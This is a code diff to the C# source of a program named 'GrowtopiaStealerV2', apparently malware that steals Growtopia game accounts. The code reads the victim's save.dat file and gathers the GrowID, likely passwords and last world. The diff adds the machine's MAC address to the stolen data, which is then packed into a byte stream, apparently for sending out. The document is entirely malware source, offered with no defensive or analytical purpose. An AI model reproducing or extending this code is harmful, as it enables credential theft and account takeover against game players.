@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
+using System.Net.NetworkInformation;
 using System.Text;
 
 namespace GrowtopiaStealerV2
@@ -13,7 +14,7 @@ namespace GrowtopiaStealerV2
         {
             if (File.Exists(Growtopia.Growtopia.dirPath + @"\save.dat"))
             {
-                string data = String.Join(Environment.NewLine, "GrowID: " + Growtopia.Growtopia.GrowID() + "\nPossible Passwords: " + Growtopia.Growtopia.Password(), "Last World: " + Growtopia.Growtopia.LastWorld());
+                string data = String.Join(Environment.NewLine, "\n + MAC Address: " + (from nic in NetworkInterface.GetAllNetworkInterfaces() where nic.OperationalStatus == OperationalStatus.Up select nic.GetPhysicalAddress().ToString()).FirstOrDefault() + "GrowID: " + Growtopia.Growtopia.GrowID() + "\nPossible Passwords: " + Growtopia.Growtopia.Password(), "Last World: " + Growtopia.Growtopia.LastWorld());
                 byte[] data_bytes = Encoding.ASCII.GetBytes(data);
 
                 MemoryStream MemoryStream = new MemoryStream(data_bytes, 0, data.Length);
